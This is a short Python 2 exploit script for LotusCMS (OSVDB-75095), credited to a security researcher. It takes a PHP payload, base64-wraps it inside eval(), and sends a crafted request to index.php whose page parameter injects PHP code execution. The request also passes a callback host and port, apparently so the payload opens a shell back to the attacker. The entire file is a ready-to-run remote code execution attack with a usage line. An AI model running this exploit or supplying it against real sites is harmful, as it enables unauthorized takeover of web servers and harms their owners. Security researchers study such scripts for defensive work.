#!/usr/bin/python2
# coding: utf-8
# Author: Darren Martyn, Xiphos Research Ltd.
# Version: 20150305.1
# Licence: WTFPL - wtfpl.net
import requests
import sys
__version__ = "20150306.1"

def banner():
    print """\x1b[1;32m
    ▄█       ███    █▄   ▄████████    ▄█   ▄█▄ ▄██   ▄        
   ███       ███    ███ ███    ███   ███ ▄███▀ ███   ██▄      
   ███       ███    ███ ███    █▀    ███▐██▀   ███▄▄▄███      
   ███       ███    ███ ███         ▄█████▀    ▀▀▀▀▀▀███      
   ███       ███    ███ ███        ▀▀█████▄    ▄██   ███      
   ███       ███    ███ ███    █▄    ███▐██▄   ███   ███      
   ███▌    ▄ ███    ███ ███    ███   ███ ▀███▄ ███   ███      
   █████▄▄██ ████████▀  ████████▀    ███   ▀█▀  ▀█████▀       
   ▀                                 ▀                        
  ▄█        ▄██████▄      ███     ███    █▄     ▄████████   
 ███       ███    ███ ▀█████████▄ ███    ███   ███    ███   
 ███       ███    ███    ▀███▀▀██ ███    ███   ███    █▀    
 ███       ███    ███     ███   ▀ ███    ███   ███          
 ███       ███    ███     ███     ███    ███ ▀███████████   
 ███       ███    ███     ███     ███    ███          ███   
 ███▌    ▄ ███    ███     ███     ███    ███    ▄█    ███   
 █████▄▄██  ▀██████▀     ▄████▀   ████████▀   ▄████████▀    
 ▀                                                            
  Exploit for LotusCMS, OSVDB-75095 Version: %s\x1b[0m""" %(__version__)

def php_encoder(php):
    f = open(php, "r").read()
    f = f.replace("<?php", "")
    f = f.replace("?>", "")
    encoded = f.encode('base64')
    encoded = encoded.replace("\n", "")
    encoded = encoded.strip()
    code = "eval(base64_decode('%s'));" %(encoded)
    return code
    
def pop_shell(target, code, cb_host, cb_port):
    cookies = {'host': cb_host, 'port': cb_port}
    data = {'0': code}
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0'}
    stager = "/index.php?page=index%27%29%3B%24{eval($_POST[0])}%3B%23"
    print "{+} Sending our payload..."
    try:
        r = requests.post(url=target+stager, data=data, headers=headers, verify=False, cookies=cookies)
    except Exception, e:
        sys.exit("[-] Exception hit! Printing:\n %s" %(str(e)))
    if r.text:
        print r.text.split("</html>")[1].rstrip()
		
def main(args):
    banner()
    if len(args) != 5:
        sys.exit("use: %s http://host/lotus_baseurl/ <payload.php> <cb_host> <cb_port>" %(args[0]))
    pop_shell(target=args[1], code=php_encoder(args[2]), cb_host=args[3], cb_port=args[4])

if __name__ == "__main__":
    main(args=sys.argv)
